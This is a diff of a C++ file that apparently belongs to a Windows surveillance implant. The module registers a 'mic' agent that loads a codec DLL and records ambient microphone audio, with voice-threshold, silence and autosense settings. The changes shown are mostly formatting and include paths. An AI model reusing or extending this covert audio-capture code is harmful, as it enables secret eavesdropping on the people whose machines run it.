@@ -1,4 +1,10 @@
-#include "HM_MicAgent/QAmbientalMicrophone.h"
+#include <Windows.h>
+#include <json/JSON.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "QAmbientalMicrophone.h"
 
 HMODULE amb_codec_handle = NULL; // Handle alla dll del codec
 BOOL bPM_AmbMicStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
@@ -14,7 +20,7 @@ BOOL  amb_mic_calibration = DEF_MIC_CALIBRATION;
 DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	char codec_path[DLLNAMELEN];
-	static QAmbientalMicrophone *AmbMicObj = NULL;
+	static QAmbientalMicrophone* AmbMicObj = NULL;
 
 	// Se l'agent e' gia' nella condizione desiderata
 	// non fa nulla.
@@ -26,11 +32,12 @@ DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 	if (bStartFlag) {
 		// Cerca di caricare il codec
 		if (!amb_codec_handle)
-			amb_codec_handle = 	LoadLibrary(HM_CompletePath(shared.H4_CODEC_NAME, codec_path));
+			amb_codec_handle = LoadLibrary(HM_CompletePath(shared.H4_CODEC_NAME, codec_path));
 
 		// ...e inizia a registrare
 		AmbMicObj = new QAmbientalMicrophone(amb_codec_handle, amb_mic_calibration, amb_mic_voice_tsld, amb_mic_silence_time);
-	} else {
+	}
+	else {
 		// Finisce la registrazione e dealloca le strutture
 		if (AmbMicObj) {
 			delete AmbMicObj;
@@ -43,10 +50,10 @@ DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 
 DWORD __stdcall PM_AmbMicInit(JSONObject elem)
 {
-	amb_mic_voice_tsld = (DWORD) (elem[L"threshold"]->AsNumber() * 1000);
-	amb_mic_silence_time = (DWORD) elem[L"silence"]->AsNumber();
+	amb_mic_voice_tsld = (DWORD)(elem[L"threshold"]->AsNumber() * 1000);
+	amb_mic_silence_time = (DWORD)elem[L"silence"]->AsNumber();
 	amb_mic_silence_time /= 5; // E' in blocchi da 5 secondi
-	amb_mic_calibration = (BOOL) elem[L"autosense"]->AsBool();
+	amb_mic_calibration = (BOOL)elem[L"autosense"]->AsBool();
 
 	return 1;
 }
@@ -59,7 +66,7 @@ DWORD __stdcall PM_AmbMicUnregister()
 	if (amb_codec_handle) {
 		// Cerca a tutti i costi di chiudere la libreria
 		// (anche se dovrebbe riuscire al primo tentativo)
-		for (i=0; i<MAX_FREE_TRIES; i++) {
+		for (i = 0; i < MAX_FREE_TRIES; i++) {
 			// Non ci sono race sulla libreria visto che il thread e' morto
 			// dopo la delete dello Stop, e la Start (dove
 			// carica la libreria) viene sempre eseguita da una action (cosi' 
@@ -76,5 +83,5 @@ DWORD __stdcall PM_AmbMicUnregister()
 
 void PM_AmbMicRegister()
 {
-	AM_MonitorRegister(L"mic", PM_AMBMICAGENT, NULL, (BYTE *)PM_AmbMicStartStop, (BYTE *)PM_AmbMicInit, (BYTE *)PM_AmbMicUnregister);
+	AM_MonitorRegister(L"mic", PM_AMBMICAGENT, NULL, (BYTE*)PM_AmbMicStartStop, (BYTE*)PM_AmbMicInit, (BYTE*)PM_AmbMicUnregister);
 }
